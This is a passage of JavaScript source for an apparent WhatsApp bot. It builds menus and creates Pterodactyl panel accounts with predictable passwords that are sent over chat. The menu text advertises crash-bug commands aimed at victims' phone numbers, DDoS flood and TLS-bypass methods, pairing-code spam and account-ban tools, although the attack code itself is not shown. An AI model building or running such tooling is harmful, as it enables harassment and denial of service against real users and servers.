id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break 
case 'allmenu':
case 'semua': {
rzxReply(audiorzx)
await loading()
let teksnya =`╭──(        🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉        )
👤名前 : ${pushname}
⛩️ タグ : @${m.sender.split('@')[0]}
═════ 𝐢𝐍𝐅𝛀 𝐁𝛀𝐓 ═══════════
➟ 𝘕𝘢𝘮𝘢 𝘉𝘰𝘵 : ⏤͟͟͞͞𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚メ
➟ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 𝘉𝘰𝘵 : 𝟐.𝟎
➟ 𝘕𝘢𝘮𝘢 𝘖𝘸𝘯𝘦𝘳 : ${global.nameCreator}
➟ 𝘕𝘰𝘮𝘰𝘳 𝘖𝘸𝘯𝘦𝘳 : ${global.owner}
➟ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦𝘉𝘰𝘵 : ${runtime(process.uptime())}
➟ 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 : 𝘗𝘢𝘯𝘦𝘭
══════ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉  ══════════

╭──(        ⿻ 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔\` 』
│ ● ᴀᴅᴅɢᴄ
│ ● ʟɪsᴛᴜsʀ
│ ● ʟɪsᴛᴀᴅᴍ
│ ● ᴅᴇʟᴜsʀ
│ ● ᴅᴇʟᴀᴅᴍ
│ ● listsrv
│ ● delsrv
│ ● toadmin
│ ● 1ɢʙ
│ ● 2ɢʙ
│ ● 3ɢʙ
│ ● 4ɢʙ
│ ● 5ɢʙ
│ ● 6ɢʙ
│ ● 7ɢʙ
│ ● 8ɢʙ
│ ● 9ɢʙ
│ ● 10ɢʙ
│ ● ᴜɴʟɪ
┗─────────────❐

╭──(        ⿻ 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐌𝐄𝐍𝐔\` 』
│ ● ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ1 [sᴜᴘᴘᴏʀᴛ ᴜʙᴜɴᴛᴜ 20.04]
│ ● ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ2 [sᴜᴘᴘᴏʀᴛ ᴜʙᴜɴᴛᴜ 22.04 - 24.04]
│ ● ɪɴsᴛᴀʟʟᴘᴀɴᴇʟᴠ3 [sᴜᴘᴘᴏʀᴛ ᴅᴇʙɪᴀɴ 11x64]
│ ● ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
│ ● ᴄʀᴇᴀᴛᴇɴᴏᴅᴇ
│ ● ɪɴsᴛᴀʟʟᴡɪɴɢs
│ ● sᴛᴀʀᴛᴡɪɴɢs
│ ● ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀᴠ1 [ᴛʜᴇᴍᴀ sᴛᴇʟʟᴇʀ]
│ ● ɪɴsᴛᴀʟʟᴛʜᴇᴍᴀᴠ2 [ᴛʜᴇᴍᴀ ᴇɴɪɢᴍᴀ]
│ ● ᴜɴɪɴsᴛᴀʟʟᴛʜᴇᴍᴀ
┗─────────────❐

╭──(        ⿻ 𝐃𝐎𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐃𝐎𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔\` 』
│ ● ʟɪsᴛᴅᴏᴍᴀɪɴ
│ ● sᴜʙᴅᴏᴍᴀɪɴ [ʜᴏsᴛ,ɪᴘ
│ ● ʟɪsᴛsᴜʙᴅᴏᴍᴀɪɴ
│ ● ᴅᴇʟsᴜʙᴅᴏᴍᴀɪɴ
┗─────────────❐

╭──(        ⿻ 𝐁𝐔𝐆. 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝑪𝑶𝑶𝑼𝑺𝑬 𝑩𝑼𝑮\` 』
│ ● xʀᴢx <ɴᴜᴍʙᴇʀ>
┗─────────────❐
┏─『 \`𝑿𝑪𝑹𝑨𝑺𝑯\` 』
│ ● xʟᴏᴡ <ɴᴜᴍʙᴇʀ>
│ ● xᴍᴇᴅ <ɴᴜᴍʙᴇʀ>
│ ● xʜᴀʀᴅ <ɴᴜᴍʙᴇʀ>
│ ● xɪᴏs <ɴᴜᴍʙᴇʀ>
│ ● xɪᴘ <ɴᴜᴍʙᴇʀ>
│ ● ɪᴘʜᴏɴᴇ <ɴᴜᴍʙᴇʀ>
│ ● ᴄʀᴀsʜʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
│ ● ᴠᴀsɪᴏɴʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
│ ● ᴏᴠᴇʀʙᴇᴛᴀ <ɴᴜᴍʙᴇʀ>
┗─────────────❐

╭──(        ⿻ DDOS MENU〽️ ⿻        )
┏─『 \`DDOS MENU\` 』
│ ● ᴅᴅᴏs
│ ● ᴍɪx
│ ● ғʟᴏᴀᴅs
│ ● ᴜᴀ
│ ● xᴄʜʀᴏᴍᴇ
│ ● ᴛʟs
│ ● ᴛʟsʙʏᴘᴀss
│ ● ᴛʟsᴠ2
│ ● ᴛʟs-ᴠɪᴘ
│ ● xc
┗─────────────❐

╭──(        ⿻ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
│ ● ᴇɴᴄ
│ ● ᴇɴᴄᴇʏᴘᴛ
│ ● ᴛᴏᴜʀʟ
│ ● ᴀɪ 
│ ● ɢᴘᴛ
│ ● sᴘᴀᴍᴘᴀɪʀ
│ ● ᴛᴇᴍᴘʙᴀɴ
┗─────────────❐

╭──(        ⿻ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔\` 』
│ ● ᴍᴇᴅɪᴀғɪʀᴇ [ʟɪɴᴋ]
│ ● ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ [ʟɪɴᴋ]
│ ● xᴠɪᴅ [ʟɪɴᴋ]
│ ● ɪɴsᴛᴀɢʀᴀᴍ [ʟɪɴᴋ]
│ ● ᴛᴛᴍᴘ3 [ʟɪɴᴋ]
│ ● ᴛᴛᴍᴘ4 [ʟɪɴᴋ]
┗─────────────❐

╭──(        ⿻ 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔\` 』
│ ● ʀᴇsᴛᴀʀᴛ
│ ● sʜᴜᴛᴅᴏᴡɴ
│ ● ʀᴇᴍᴏᴠᴇʙɢ
│ ● ᴘɪɴ
│ ● ᴘʟᴀʏ
│ ● ʜᴅ
│ ● ʜᴅʀ
│ ● sᴇʟғ
│ ● ᴘᴜʙʟɪᴄ
│ ● ʀᴠᴏ
│ ● done
│ ● batal
│ ● tunda
│ ● proses
│ ● reqvps
│ ● listvps1
│ ● listvps2
│ ● reqpanel
┗─────────────❐

╭──(        ⿻ 𝐆𝐑𝐔𝐏 𝐌𝐄𝐍𝐔〽️ ⿻        )
┏─『 \`𝐆𝐑𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
│ ● ʜɪᴅᴇᴛᴀɢ
│ ● ᴘʀᴏᴍᴏᴛᴇ
│ ● ᴅᴇᴍᴏᴛᴇ
│ ● ᴀɴᴛɪʟɪɴᴋ
│ ● ᴀɴᴛɪʟɪɴᴋᴠ2
│ ● ᴏᴘᴇɴ/ᴄʟᴏsᴇ
│ ● sᴇᴛɴᴀᴍᴀɢᴄ
│ ● sᴇᴛᴘᴘɢᴄ
│ ● ᴋɪᴄᴋ
│ ● ʜɪᴅᴇᴛᴀɢ
│ ● ʟᴇᴀᴠᴇɢᴄ
│ ● ʟᴇᴀᴠᴇɢᴄ2
┗─────────────❐
┏━━⬣  Thanks To  友
┃ 🔥 RizxzWangsaff <dev>
┃ 🔥 Zyxnoo
┃ 🔥 The Getsuzo Zhiro
┗━━⬣  ⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉 ⌟  ⿻`
let sections = [{
title: '⿻  ⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻',
highlight_label: '𝑨𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰ 𝑨𝒍𝒍 𝑴𝒆𝒏𝒖 ཀ͜͡🐉', 
id: '.allmenu'
}]
},
{
title: '⿻  ⌜ 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝑻𝒐𝒐𝒍𝒔 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰T̥ͦo̥ͦo̥ͦl̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.toolsmenu'
}]
},
{
highlight_label: '𝐆𝐫𝐮𝐩 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰G̥ͦr̥ͦu̥ͦp̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.grupmenu'
}]
},
{
highlight_label: '𝑩𝒖𝒈 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰B̥ͦu̥ͦg̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.bugmenu'
}]
},
{
highlight_label: '𝑰𝒏𝒔𝒕𝒂𝒍𝒍 𝑴𝒆𝒏𝒖〽️',
rows: [{
title: '🩸⃟༑⌁⃰I̥ͦn̥ͦs̥ͦt̥ͦḁͦl̥ͦ  M̥ͦe̥ͦn̥ͦu̥ͦ ཀ͜͡🐉', 
id: '.installpanelmenu'
}]
},
{
title: '⿻  ⌜ 𝐑𝐳𝐱𝐕𝐯𝐢𝐩 𝑴𝒆𝒏𝒖〽️ ⌟  ⿻',
highlight_label: '𝐔𝐧𝐛𝐚𝐧𝐝 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ U̥ͦn̥ͦb̥ͦḁͦn̥ͦd̥ͦ  M̥ͦe̥ͦn̥ͦu̥̥̬ͦͦ̂ ཀ͜͡🐉', 
id: '.unbandmenu'
}]
},
{
highlight_label: '𝐃𝐝𝐨𝐬 𝐌𝐞𝐧𝐮〽️',
rows: [{
title: '🩸⃟༑⌁⃰ D̥ͦd̥ͦo̥ͦs̥ͦ  M̥ͦe̥ͦn̥ͦu̥̬ͦ̂ ཀ͜͡🐉', 
id: '.ddosmenu'
}]
},
{
highlight_label: '𝐒𝐩𝐚𝐦 𝐊𝐨𝐝𝐞〽️',
rows: [{
title: '🩸⃟༑⌁⃰ Ŝ̬p̬̂â̬m̬̂  P̬̂â̬î̬r̬̂ ཀ͜͡🐉', 
id: '.spampair'
}]
},
{
highlight_label: '𝐓𝐞𝐦𝐩 𝐁𝐚𝐧𝐝〽️',
rows: [{
title: '🩸⃟༑⌁⃰ T̥ͦe̥ͦm̥ͦp̥ͦ  B̥ͦḁͦn̥ͦd ཀ͜͡🐉', 
id: '.tempban'
}]
}]
let listMessage = {
    title: '⌜ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdrzxReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/Menu.jpg")}, { upload: rzx.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rzx.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break
case 'ai':{
if (args[0] === "enable") {
if (db.data.chats[m.chat].rzx) return rzxReply(`activated`)
db.data.chats[m.chat].rzx = true
rzxReply('Successfully Activate Auto Chat')
} else if (args[0] === "disable") {
if (!db.data.chats[m.chat].rzx) return rzxReply(`it's deactivated`)
db.data.chats[m.chat].rzx = false
rzxReply('Successfully Disabling Auto Chat ')
} else {
rzxReply(`${prefix+command} enable -- _mengaktifkan_\n${prefix+command} disable -- _Menonaktifkan_`)
}}
break
case "1gb": {
    if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-TyPe": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : *62895364760801*
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 
𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔
𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 
𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 
𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛
𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/62895364760801
=====================================
`
rzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "PANEL BY RIZXVELZ⚡,TERIMAKASIH SUDAH ORDER",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return rzxReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await rzxReply(`
 *SUCCES CREATE SERVER*
**
 𝐃𝐨𝐧𝐞 𝐁𝐲 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🇵🇸🦅 ⚡

TYPE: user

ID: ${server.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return rzxReply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return rzxReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg" 
if (!u) return
let d = (await rzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return rzxReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
rzxReply(`SUCCES CREATE USER ID: ${user.id}`)
